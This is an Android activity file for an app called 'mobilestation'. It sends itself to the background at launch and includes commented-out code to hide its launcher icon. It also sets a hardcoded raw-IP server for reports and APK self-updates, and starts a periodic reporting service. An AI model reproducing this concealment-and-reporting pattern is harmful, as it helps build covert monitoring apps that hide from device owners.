package com.mobilestation;

import java.io.File;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.view.Menu;

import com.mobilestation.receiver.Alarmreceiver;
import com.mobilestation.receiver.TimeBroadcastReceiver;
import com.mobilestation.util.AlarmManagerUtil;
import com.mobilestation.util.LogcatFileManager;

public class MainActivity extends Activity {
	private static final String TAG = "DetailProceess";

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		startLogcatManager();
		setContentView(R.layout.activity_main);
		// runService();

		Log.i(TAG, "程序开始运行");

		moveTaskToBack(true);

		// 隐藏自己
		// PackageManager p = getPackageManager();
		// p.setComponentEnabledSetting(getComponentName(),
		// PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
		// PackageManager.DONT_KILL_APP);

		SharedPreferences sharedPreferences = getSharedPreferences("setting",
				MODE_PRIVATE);
		Editor editor = sharedPreferences.edit();// 获取编辑器
		editor.putString("SERVER_URL", "http://113.105.178.212:8090");
		editor.putString(
				"APK_PATH",
				"http://113.105.178.212:8090/downloads/Androids/com.mobilestation/android_2.0.apk");
		editor.putString("UPDATE_SERVER",
				"http://113.105.178.212:8090/downloads/Androids/com.mobilestation/");
		editor.putString("UPDATE_VERJSON", "ver.json");
		editor.putInt("POST_INTERVAL", 300 * 1000);
		editor.putInt("CHECKAPP_INTERVAL", 1 * 1000);
		editor.commit();// 提交修改

		// AlarmManagerUtil.sendUpdateBroadcast(this.getApplicationContext());
		//
		// TimeBroadcastReceiver timeBroadcastReceiver = new
		// TimeBroadcastReceiver();
		// // 设置接收的action
		// IntentFilter filter = new IntentFilter();
		// filter.addAction("android.intent.action.TIME_TICK");
		// registerReceiver(timeBroadcastReceiver, filter);

		Context context = this.getApplicationContext();
		boolean isServiceRunning = false;
		ActivityManager manager = (ActivityManager) context
				.getSystemService(Context.ACTIVITY_SERVICE);
		for (RunningServiceInfo service : manager
				.getRunningServices(Integer.MAX_VALUE)) {
			if ("com.mobilestation.service.ReportService"
					.equals(service.service.getClassName())) {
				isServiceRunning = true;
			}
		}
		if (!isServiceRunning) {
			Intent i = new Intent();
			i.setClass(context, com.mobilestation.service.ReportService.class);
			i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			context.startService(i);
		}
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

//	@Override
//	protected void onDestroy() {
//		stopLogcatManager();
//		super.onDestroy();
//		Log.e(TAG, "start onDestroy~~~");
//	}

	private void startLogcatManager() {
		String folderPath = null;

		if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_MOUNTED)) {
			// save in SD card first
			folderPath = Environment.getExternalStorageDirectory()
					.getAbsolutePath() + File.separator + "BDT-Logcat";
		} else {
			// If the SD card does not exist, save in the directory of
			// application.
			folderPath = this.getFilesDir().getAbsolutePath() + File.separator
					+ "BDT-Logcat";
		}

		LogcatFileManager.getInstance().start(folderPath);
	}

	private void stopLogcatManager() {
		LogcatFileManager.getInstance().stop();
	}

}
